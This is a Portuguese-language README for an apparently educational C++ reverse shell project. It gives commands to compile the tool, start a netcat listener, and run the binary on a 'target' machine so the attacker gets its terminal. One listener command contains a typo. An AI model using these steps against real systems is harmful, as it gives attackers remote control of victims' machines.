# CPP Reverse Shell

[![MIT License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![GitHub Issues](https://img.shields.io/github/issues/ZXyoukai/CPP-reverse-shell.svg)](https://github.com/ZXyoukai/CPP-reverse-shell/issues)

Bem-vindo ao **CPP Reverse Shell**!  
Este projeto demonstra como implementar uma reverse shell em C++ para fins educacionais e de pesquisa.

⚠️ **Atenção:** Use este código apenas em ambientes controlados e para aprendizado. O uso indevido pode ser ilegal.

---

## 🚀 Como funciona?

Uma reverse shell conecta-se de volta a um servidor controlado pelo atacante, permitindo a execução remota de comandos.  
**Exemplo de fluxo:**
1. O atacante inicia um listener (`nc -lvnp 4444`)
2. A vítima executa o binário da reverse shell
3. O atacante recebe acesso remoto ao terminal da vítima

---

## 🛠️ Como usar

### 1. Clone o repositório
```bash
git clone https://github.com/ZXyoukai/CPP-reverse-shell.git
cd CPP-reverse-shell
```

### 2. Compile o projeto
```bash
g++ -o reverse_shell reverse_shell.cpp
```

### 3. Execute o listener no seu servidor
```bash
c -lvnp 4444
```

### 4. Execute a reverse shell na máquina alvo
```bash
./reverse_shell <IP_DO_SERVIDOR> <PORTA>
```
> Exemplo: `./reverse_shell 192.168.1.10 4444`

---

## 🤝 Contribua!

Quer melhorar este projeto?  
- Faça um fork
- Crie uma branch: `git checkout -b minha-feature`
- Envie um PR!

---

## 🔍 Referências

- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Documentação C++ Sockets](https://www.cplusplus.com/reference/cstdio/)

---

## 📜 Licença

Distribuído sob a licença MIT. Veja o arquivo `LICENSE` para mais informações.

---

> _Dúvidas ou sugestões? Abra uma [issue](https://github.com/ZXyoukai/CPP-reverse-shell/issues)!_